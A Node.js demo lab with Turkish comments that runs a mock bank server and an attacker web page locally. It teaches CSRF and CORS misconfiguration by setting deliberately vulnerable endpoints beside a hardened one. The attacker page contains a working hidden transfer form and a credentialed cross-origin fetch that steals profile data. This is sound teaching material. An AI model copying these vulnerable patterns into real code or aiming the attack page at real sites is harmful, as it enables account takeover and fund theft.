const http = require('http');
const url = require('url');

// Bellek içi banka bakiyeleri
const accounts = {
  alice: { balance: 1000, csrfToken: 'token_alice_secret_123' },
  attacker: { balance: 0 }
};

// 1. BANKA UYGULAMA SUNUCUSU (Hedef: Port 4001)
const bankServer = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const origin = req.headers['origin'] || '';
  const cookie = req.headers['cookie'] || '';

  // Çerez Ayrıştırma Yardımcısı
  const parseCookies = (cookieStr) => {
    return cookieStr.split(';').reduce((acc, pair) => {
      const [k, v] = pair.trim().split('=');
      if (k) acc[k] = v;
      return acc;
    }, {});
  };
  const cookies = parseCookies(cookie);

  // A. Oturum Açma / Çerez Dağıtımı: GET /login
  // Farklı SameSite politikalarına sahip çerezleri basar
  if (parsedUrl.pathname === '/login') {
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Set-Cookie': [
        'strict_session=ALICE_STRICT; Path=/; HttpOnly; SameSite=Strict',
        'lax_session=ALICE_LAX; Path=/; HttpOnly; SameSite=Lax',
        'none_session=ALICE_NONE; Path=/; HttpOnly; SameSite=None; Secure',
        'csrf_token=token_alice_secret_123; Path=/; SameSite=Lax'
      ]
    });
    return res.end(JSON.stringify({ 
      status: "AUTHENTICATED", 
      user: "alice", 
      accounts 
    }));
  }

  // B. ZAFİYETLİ CORS UÇ NOKTASI: GET /api/sensitive-profile
  // HATA: Gelen Origin'i dinamik olarak yansıtır ve Credentials: true verir.
  if (parsedUrl.pathname === '/api/sensitive-profile') {
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': origin || '*',
      'Access-Control-Allow-Credentials': 'true'
    });
    return res.end(JSON.stringify({
      user: "alice",
      balance: accounts.alice.balance,
      cookiesReceived: cookies
    }));
  }

  // C. ZAFİYETLİ HAVALE (CSRF Açığı): POST /api/vulnerable-transfer
  // HATA: Sadece çereze güvenir, CSRF Token kontrolü yapmaz.
  if (parsedUrl.pathname === '/api/vulnerable-transfer' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      // Lax veya None çerezi gelmişse transferi yapar!
      if (!cookies.lax_session && !cookies.none_session && !cookies.strict_session) {
        res.writeHead(401, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: "Oturum çerezi bulunamadı." }));
      }

      const params = new URLSearchParams(body);
      const to = params.get('to') || 'attacker';
      const amount = parseInt(params.get('amount') || '100', 10);

      accounts.alice.balance -= amount;
      accounts.attacker.balance += amount;

      console.log(`[!] [CSRF BAŞARILI] Alice -> ${to}: ${amount} TL aktarıldı. Yeni Bakiye: ${accounts.alice.balance}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ status: "TRANSFER_COMPLETE", balance: accounts.alice.balance }));
    });
    return;
  }

  // D. SIKILAŞTIRILMIŞ UÇ NOKTA: POST /api/hardened-transfer
  // KORUMA 1: SameSite=Strict çerez zorunluluğu
  // KORUMA 2: Custom Anti-CSRF Token doğrulaması
  // KORUMA 3: Origin / Referer başlık doğrulaması
  const ALLOWED_ORIGIN = 'http://127.0.0.1:4001';

  if (parsedUrl.pathname === '/api/hardened-transfer') {
    // 1. Preflight OPTIONS Kontrolü
    if (req.method === 'OPTIONS') {
      if (origin === ALLOWED_ORIGIN) {
        res.writeHead(204, {
          'Access-Control-Allow-Origin': ALLOWED_ORIGIN,
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, X-CSRF-Token',
          'Access-Control-Allow-Credentials': 'true'
        });
      } else {
        res.writeHead(403);
      }
      return res.end();
    }

    if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => body += chunk);
      req.on('end', () => {
        // Kontrol 1: Origin/Referer Doğrulaması
        if (origin && origin !== ALLOWED_ORIGIN) {
          res.writeHead(403, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: "Cross-Site Origin Engellendi." }));
        }

        // Kontrol 2: Strict Session Çerez Kontrolü
        if (!cookies.strict_session) {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: "SameSite=Strict oturum çerezi zorunludur." }));
        }

        // Kontrol 3: Anti-CSRF Token Kontrolü (Header veya Body)
        const csrfHeader = req.headers['x-csrf-token'];
        const params = new URLSearchParams(body);
        const csrfBody = params.get('csrf_token');
        const tokenReceived = csrfHeader || csrfBody;

        if (!tokenReceived || tokenReceived !== accounts.alice.csrfToken) {
          res.writeHead(403, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: "Geçersiz veya eksik Anti-CSRF Token." }));
        }

        const to = params.get('to') || 'attacker';
        const amount = parseInt(params.get('amount') || '50', 10);
        accounts.alice.balance -= amount;

        res.writeHead(200, {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': ALLOWED_ORIGIN,
          'Access-Control-Allow-Credentials': 'true'
        });
        return res.end(JSON.stringify({ status: "SECURE_TRANSFER_COMPLETE", balance: accounts.alice.balance }));
      });
      return;
    }
  }

  res.writeHead(404);
  res.end('Not Found');
});

// 2. SALDIRGAN WEB SİTESİ (Port 4002)
const attackerServer = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(`
    <!DOCTYPE html>
    <html>
    <head><title>Saldırgan Sitesi (Cross-Origin)</title></head>
    <body>
      <h1>Ödül Kazandınız!</h1>
      <!-- Otomatik tetiklenen CSRF Formu -->
      <form id="csrfForm" action="http://127.0.0.1:4001/api/vulnerable-transfer" method="POST">
        <input type="hidden" name="to" value="attacker" />
        <input type="hidden" name="amount" value="500" />
      </form>

      <script>
        // 1. Zafiyetli CORS üzerinden veri sızdırma
        fetch('http://127.0.0.1:4001/api/sensitive-profile', { credentials: 'include' }) 
          .then(r => r.json())
          .then(data => console.log('[Saldırgan JS] Profil çalındı:', data))
          .catch(e => console.error(e));

        // 2. CSRF Form Gönderimi
        // document.getElementById('csrfForm').submit();
      </script>
    </body>
    </html>
  `);
});

bankServer.listen(4001, '127.0.0.1', () => {
  console.log('[+] Banka API Dinlemede: http://127.0.0.1:4001');
});

attackerServer.listen(4002, '127.0.0.1', () => {
  console.log('[+] Saldırgan Web Sayfası: http://127.0.0.1:4002');
});
